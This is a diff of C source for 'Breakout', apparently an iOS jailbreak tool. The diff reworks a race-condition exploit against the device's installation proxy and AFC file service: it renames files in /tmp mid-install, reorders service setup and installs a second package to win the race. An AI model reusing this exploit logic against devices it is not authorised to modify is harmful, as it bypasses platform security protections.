@@ -326,9 +326,10 @@ afc_error_t afc_receive_file(afc_client_t afc, const char* remote,
 
 void minst_cb(const char *operation, plist_t status, int *unused) {
     cb++;
-	printf("cb=%d exploit=%d \n",cb,exploit);
+	//printf("cb=%d exploit=%d \n",cb,exploit);
     if (cb == 1) {
-		afc_read_directory(gAfc, "tmp/", &list);
+        list = NULL;
+        afc_read_directory(gAfc, "tmp/", &list);
 		if (list) {
 			while (list[0]) {
 					if (strcmp(list[0], ".") && strcmp(list[0], "..")) {
@@ -362,10 +363,15 @@ void minst_cb(const char *operation, plist_t status, int *unused) {
         afcerr = afc_rename_path(gAfc, fooS, fooSOld);
         if (afcerr != AFC_E_SUCCESS) {
             printf("%s [*] Could not rename %s -> %s %s\n\n", KRED, fooS,fooSOld, KNRM);
+            installError = 1;
         }
         afcerr = afc_rename_path(gAfc, fooSNew, fooS);
         if (afcerr != AFC_E_SUCCESS) {
             printf("%s [*] Could not rename foo.new -> foo%s\n\n", KRED, KNRM);
+            installError = 1;
+        }
+        if (installError == 0) {
+            printf("%s [*] Successfully exploited racecondition :D\n%s",KGRN,KNRM);
         }
     }
 	
@@ -392,10 +398,13 @@ void minst_cb(const char *operation, plist_t status, int *unused) {
 			char *err_msg = NULL;
 			plist_get_string_val(nerror, &err_msg);
 			printf("Error: %s", err_msg);
-			printf("%s\n [*] This would be an error if it wasn't an exploit :P%s\n\n", KNRM, KNRM);
 			free(err_msg);
 			installing = 0;
 			installError = 1;
+            if (exploit >= 1){
+                printf("%s\n [*] This would be an error if it wasn't an exploit :P%s\n\n", KNRM, KNRM);
+                installError = 0;
+            }
 		}
 	} else {
 		printf("%s: called with invalid data!\n", __func__);
@@ -582,7 +591,8 @@ int installIPA(char *ipaLocation, int explt) {
 	printf(" [*] Requesting installation proxy to install custom app...\n");
 	exploit = explt;
     plist_t opts = instproxy_client_options_new();
-	
+	installing = 1;
+    cb=0;
     ie = instproxy_install(instproxy, ipaLocation, opts, &minst_cb, NULL);
 	if (ie != INSTPROXY_E_SUCCESS && exploit != 1) {
 		printf("%s [*] Installation proxy could not install app %d. Please reboot your device and try again.%s\n\n", KRED, ie, KNRM);
@@ -595,15 +605,10 @@ int installIPA(char *ipaLocation, int explt) {
 		sleep(1);
 	}
 	
-	if (installError && exploit >= 1) {
+	if (installError) {
 		return -1;
 	}
     
-    printf(" [*] Cleaning up instaproxy \n");
-    instproxy_client_options_free(opts);
-    instproxy_client_free(instproxy);
-    
-	printf("%s [*] Installation proxy successfully installed app!%s\n\n", KGRN, KNRM);
 	return 0;
 }
 
@@ -929,7 +934,7 @@ int main(int argc, char *argv[]) {
 	}
 		
 	// just in case Breakout has been run before, we don't want any issues arising from old/new files.
-	performSanityChecks(); //this doesnt work at all :(                                            ####
+	performSanityChecks();
 	
 	// create our storage dir and upload requires files etc.	
 	if (preflightBreakout() != 0) {
@@ -958,16 +963,15 @@ int main(int argc, char *argv[]) {
 	if (startInstallationProxy() != 0) {
 		return -1;
 	}
-    //lockdownd already freed here
-    
-	// install custom (breakout) ipa
-    
-	if (installIPA("Breakout-Install/breakout.ipa",0) != 0) {
+    if (freeLockdown() != 0) {
 		return -1;
 	}
-
-	// get access to /tmp, we need this
+    // get access to /tmp, we need this
 	if (accessTmpHax() != 0) {
+		return -1;
+	}
+    
+	if (installIPA("Breakout-Install/breakout.ipa",0) != 0) {
 		return -1;
 	}
 	
@@ -997,7 +1001,6 @@ int main(int argc, char *argv[]) {
 		return -1;
 	}
 
-	
 	//you need to modify the caches and add the values here                              ####
 	//                                                                                   ####
 	//
@@ -1007,39 +1010,29 @@ int main(int argc, char *argv[]) {
 	}
 
 	//race condition exploit :P
-     //you need to fix minst_cb not called second time                                   ####
-     //that means you can either inject breakout.ipa or exploit race condition :(        ####
     if (startLockdownd() != 0) {
 		return -1;
 	}
     if (startInstallationProxy() != 0) {
 		return -1;
 	}
+    if (freeLockdown() != 0) {
+		return -1;
+	}
 	printf(" [*] Trying to exploit race condition (1/2)\n");
 	if (installIPA("Breakout-Install/pkg.zip",1) !=0){
 		return -1;
 	}
-    if (startInstallationProxy() != 0) {
-		return -1;
-	}
     printf(" [*] Trying to exploit race condition (2/2)\n");
-	if (installIPA("Breakout-Install/pkg.zip",2) !=0){
+	if (installIPA("Breakout-Install/pkg2.zip",2) !=0){
 		return -1;
 	}
-    if (freeLockdown() != 0) {
-		return -1;
-	}
-    
-    
-    return 0;
-    
+
     //rebooting + waiting to reconnect
     if (rebootDevice() != 0) {
         printf("%s [*] Error rebooting device, please disconnect, reboot manually and reconnect\n%s",KRED,KNRM);
         sleep(20);
     }
-    
-    
     
     printf(" [*] Waiting for the device to reconnect...\n");
 	while (deviceConnect() != 0) {
@@ -1083,9 +1076,10 @@ int main(int argc, char *argv[]) {
     
     
     printf("%s [*] No errors yey :D!%s\n", KGRN, KNRM);
-	return 0;
+	//return 0;
 	printf("%s [*] Breakout is complete, you should now have a fully working jailbreak! Enjoy!%s\n", KGRN, KNRM);
-	printf("%s [*] Breakout was written by DarkMalloc et. al.%s\n\n", KGRN, KNRM);
+	printf("%s [*] Breakout was written by %stihmstar%s and DarkMalloc et. al.%s\n", KGRN,KRED,KGRN KNRM);
+    printf("%s [*] Thanks a lot to %sx56%s for helping me really out a lot and staying calm while being in one chatroom with me :P %s",KGRN,KRED,KGRN,KNRM);
 	
 	return 0;
 	
